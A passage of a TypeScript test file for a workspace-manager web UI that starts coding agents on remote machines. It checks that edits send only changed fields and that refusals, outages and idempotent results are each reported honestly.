      '/api/sessions': { looked: 'never' },
    }
    vi.stubGlobal(
      'fetch',
      vi.fn((path: string, init?: RequestInit) => {
        if (init?.method === 'PATCH') {
          patched(path, String(init.body))
          return Promise.resolve({
            status,
            json: () => Promise.resolve(body),
            text: () => Promise.resolve(String(body)),
          })
        }
        return Promise.resolve({
          ok: true,
          status: 200,
          json: () => Promise.resolve(looks[path] ?? { looked: 'never' }),
        })
      }),
    )
    return patched
  }

  // The three labels are the create form's three, so every field is asked for
  // by the id this form gives it rather than by its text.
  const fields = () => ({
    machine: screen.getByLabelText('Machine', { selector: '#edit-machine' }),
    repo: screen.getByLabelText('Repo', { selector: '#edit-repo' }),
    startup: screen.getByLabelText('Startup', { selector: '#edit-startup' }),
  })

  async function open() {
    fireEvent.click(await screen.findByRole('button', { name: 'Edit' }))
    await screen.findByLabelText('Repo', { selector: '#edit-repo' })
  }

  const save = () =>
    fireEvent.click(screen.getByRole('button', { name: 'Save changes' }))

  it('sends the field that changed and no other, and draws the answer', async () => {
    const patched = stubEdit(200, { ...site, repo: '/code/fixed' })
    render(<App />)
    await open()

    expect(screen.getByText('Edit site')).toBeTruthy()
    fireEvent.change(fields().repo, { target: { value: '/code/fixed' } })
    save()

    expect(await screen.findByText('Edited site.')).toBeTruthy()
    // A body naming `machine` would be a move of a workspace nobody moved.
    expect(patched).toHaveBeenCalledWith(
      '/api/workspaces/site',
      '{"repo":"/code/fixed"}',
    )
    expect(screen.getByText('/code/fixed')).toBeTruthy()
    // The read model is 30 s behind its own write, which is what re-reading to
    // confirm would have drawn.
    expect(screen.getByText('/code/site')).toBeTruthy()
  })

  it('clears a startup command rather than leaving it alone', async () => {
    const patched = stubEdit(200, { ...site, startup: null })
    render(<App />)
    await open()

    fireEvent.change(fields().startup, { target: { value: '' } })
    save()

    expect(await screen.findByText(/will open a plain shell/)).toBeTruthy()
    // `null`, not a missing key: absent is the one that leaves it alone.
    expect(patched).toHaveBeenCalledWith(
      '/api/workspaces/site',
      '{"startup":null}',
    )
  })

  it('reads a session still open as a refusal to move it, never as a crash', async () => {
    const said =
      'cannot move site off cachyos-g14: a tmux session named site is still open there — `yantra down site` ends it'
    const patched = stubEdit(409, said)
    render(<App />)
    await open()

    fireEvent.change(fields().machine, {
      target: { value: 'bishwajeets-macbook-pro' },
    })
    save()

    // The daemon's own sentence, which is where the workspace, the machine and
    // the command that ends the refusal are.
    expect(await screen.findByText(said)).toBeTruthy()
    expect(screen.getByText(/still open on the machine this would leave/)).toBeTruthy()
    expect(screen.getByRole('alert').className).not.toContain('destructive')
    expect(screen.queryByText(/^Edited /)).toBeNull()
    expect(patched).toHaveBeenCalledWith(
      '/api/workspaces/site',
      '{"machine":"bishwajeets-macbook-pro"}',
    )
  })

  it('sends nothing at all when nothing in the form differs', async () => {
    const patched = stubEdit(200, site)
    render(<App />)
    await open()
    save()

    expect(await screen.findByText(/Nothing here differs/)).toBeTruthy()
    // A body naming no field is the daemon's 400, and it would read as one.
    expect(patched).not.toHaveBeenCalled()
  })

  // ADR-0009: a machine name is an ssh destination, so it may be an
  // `~/.ssh/config` alias no tailnet reading lists.
  it('keeps a machine the tailnet does not list, so a repo fix is not a move', async () => {
    const alias = { ...site, machine: 'homelab-box' }
    const patched = stubEdit(200, { ...alias, repo: '/code/fixed' }, alias)
    render(<App />)
    await open()

    expect((fields().machine as HTMLSelectElement).value).toBe('homelab-box')
    fireEvent.change(fields().repo, { target: { value: '/code/fixed' } })
    save()

    expect(await screen.findByText('Edited site.')).toBeTruthy()
    expect(patched).toHaveBeenCalledWith(
      '/api/workspaces/site',
      '{"repo":"/code/fixed"}',
    )
  })
})

/** Y-113. The tests that matter are the dishonest readings: an idempotent `up`
 *  must not read as a failure, a `tailscale` that could not answer must not read
 *  as the caller's fault, and a request still awaiting ssh must not read as
 *  done. The machine is never sent — it is the workspace's own (Y-117). */
describe('acting on a workspace', () => {
  const site: Workspace = {
    name: 'personal-website',
    machine: 'bishwajeets-macbook-pro',
    repo: '/Users/<user>/Github/personal-website',
    startup: null,
  }
  const mac = machine({
    name: 'bishwajeets-macbook-pro',
    os: 'macOS',
    online: false,
    heartbeat: beat({ age_seconds: 92 }),
  })

  type Answer = { status: number; body: unknown } | 'never'

  function stubAct(answer: Answer, workspace = site) {
    const posted = vi.fn()
    const looks: Record<string, Looked<unknown>> = {
      '/api/machines': { looked: 'ok', age_seconds: 2, data: [mac] },
      '/api/workspaces': { looked: 'ok', age_seconds: 2, data: [workspace] },
    }
    vi.stubGlobal(
      'fetch',
      vi.fn((path: string, init?: RequestInit) => {
        if (init?.method === 'POST') {
          posted(
            path,
            init.body === undefined ? undefined : JSON.parse(String(init.body)),
          )
          if (answer === 'never') return new Promise(() => {})
          return Promise.resolve({
            ok: answer.status < 400,
            status: answer.status,
            json: () => Promise.resolve(answer.body),
            text: () => Promise.resolve(String(answer.body)),
          })
        }
        return Promise.resolve({
          ok: true,
          status: 200,
          json: () => Promise.resolve(looks[path] ?? { looked: 'never' }),
        })
      }),
    )
    return posted
  }

  const tap = async (name: string) =>
    fireEvent.click(await screen.findByRole('button', { name }))

  it('reads a second up as attached rather than as a failure', async () => {
    stubAct({
      status: 200,
      body: {
        machine: 'bishwajeets-macbook-pro',
        session: 'attached',
        launched: false,
        term: 'xterm-256color',
      },
    })
    render(<App />)
    await tap('Start claude')

    expect(
      await screen.findByText(/already open on bishwajeets-macbook-pro/),
    ).toBeTruthy()
    // §B4 and I-30: nothing launched beside an attached session is the
    // idempotent success, so it may not be drawn as a refusal.
    expect(screen.getByRole('alert').className).not.toContain('destructive')
    expect(screen.queryByText(/The verb ran and failed/)).toBeNull()
  })

  it("does not read a tailscale that could not answer as the caller's fault", async () => {
    const said =
      'could not establish who is calling: whois failed: failed to connect to local tailscaled'
    stubAct({ status: 503, body: said })
    render(<App />)
    await tap('Start claude')

    expect(await screen.findByText(/Nothing could be asked/)).toBeTruthy()
    expect(screen.getByText(said)).toBeTruthy()
    expect(
      screen.queryByText(
        /knows no workspace|not one the daemon accepts|not on a node/,
      ),
    ).toBeNull()
  })

  // Y-135 and I-49: a human has not answered a dialog on their own machine,
  // which ADR-0011 leaves to them. Nothing failed, so nothing may say it did.
  it('draws an agent holding at the trust prompt as a refusal, not a crash', async () => {
    const said =
      "`personal-website` is holding at claude's trust prompt, so it has no conversation to continue"
    stubAct({ status: 409, body: said })
    render(<App />)
    await tap('Resume')

    expect(await screen.findByText(/Nothing broke and nothing ran/)).toBeTruthy()
    expect(screen.getByText(said)).toBeTruthy()
    expect(screen.getByRole('alert').className).not.toContain('destructive')
    expect(screen.queryByText(/The verb ran and failed/)).toBeNull()
  })

  it('keeps a missing workspace apart from a verb that ran and failed', async () => {
    stubAct({
      status: 404,
      body: 'no workspace named personal-website at /home/<user>/.config/yantra/workspaces/personal-website.toml',
    })
    render(<App />)
    await tap('Start claude')

    expect(
      await screen.findByText('The daemon knows no workspace by that name.'),
    ).toBeTruthy()
    expect(screen.queryByText(/The verb ran and failed/)).toBeNull()
  })

  it('does not read a request still awaiting ssh as done, and sends one', async () => {
    const posted = stubAct('never')
    render(<App />)
    await tap('Start claude')

    const flight = await screen.findByRole('button', { name: 'starting…' })
    expect(flight.hasAttribute('disabled')).toBe(true)
    expect(screen.getByText(/waiting on bishwajeets-macbook-pro/)).toBeTruthy()
    // Nothing has been answered, so nothing may be reported.
    expect(screen.queryByRole('alert')).toBeNull()

    fireEvent.click(flight)
    fireEvent.click(screen.getByRole('button', { name: 'Stop' }))
    expect(posted).toHaveBeenCalledTimes(1)
  })

  // ADR-0009 and R-23: the daemon decides whether a sleeping Mac can be
  // reached, and the page neither refuses for it nor hides what it knows.
  it('says the machine is asleep and still lets the button be tapped', async () => {
    const posted = stubAct({
      status: 200,
      body: {
        machine: 'bishwajeets-macbook-pro',
        session: 'created',
        launched: true,
        term: 'xterm-256color',
      },
    })
    render(<App />)

    // Once in the machines table, once beside the workspace it will act on.
    expect((await screen.findAllByText('asleep or off')).length).toBe(2)
    const start = await screen.findByRole('button', { name: 'Start claude' })
    expect(start.hasAttribute('disabled')).toBe(false)

    fireEvent.click(start)
    expect(
      await screen.findByText('Started on bishwajeets-macbook-pro.'),
    ).toBeTruthy()
    // The machine is not in the body: the target is the workspace's own.
    expect(posted).toHaveBeenCalledWith('/api/workspaces/personal-website/up', {
      agent: 'claude',
    })
  })

  it('reads nothing to stop, and an agent already working, as successes', async () => {
    stubAct({
      status: 200,
      body: { machine: 'bishwajeets-macbook-pro', stopped: false, ending: null },
    })
    render(<App />)
    await tap('Stop')

    expect(await screen.findByText(/nothing to stop/)).toBeTruthy()
    expect(screen.getByRole('alert').className).not.toContain('destructive')

    cleanup()
    stubAct({
      status: 200,
      body: {
        machine: 'bishwajeets-macbook-pro',
        resumed: false,
        term: 'xterm-256color',
      },
    })
    render(<App />)
    await tap('Resume')

    expect(await screen.findByText(/left exactly as it is/)).toBeTruthy()
    expect(screen.getByRole('alert').className).not.toContain('destructive')
  })

  it('offers no resume, and no agent, to a workspace that starts its own thing', async () => {
    const editor = { ...site, startup: 'npm run dev' }
    const posted = stubAct(
      {
        status: 200,
        body: {
          machine: 'bishwajeets-macbook-pro',
          session: 'created',
          // `launched` reports an agent, and a workspace's own startup is not
          // one — measured live against a session that really was running it.
          launched: false,
          term: 'xterm-256color',
        },
      },
      editor,
    )
    render(<App />)
    await tap('Start')

    // ADR-0015 refuses it on sight, and ADR-0007 refuses the agent beside it.
    expect(screen.queryByRole('button', { name: 'Resume' })).toBeNull()
    expect(posted).toHaveBeenCalledWith(
      '/api/workspaces/personal-website/up',
      {},
    )
    expect(await screen.findByText(/running the workspace's own startup/)).toBeTruthy()
    expect(screen.queryByText(/holding a plain shell/)).toBeNull()
  })
})
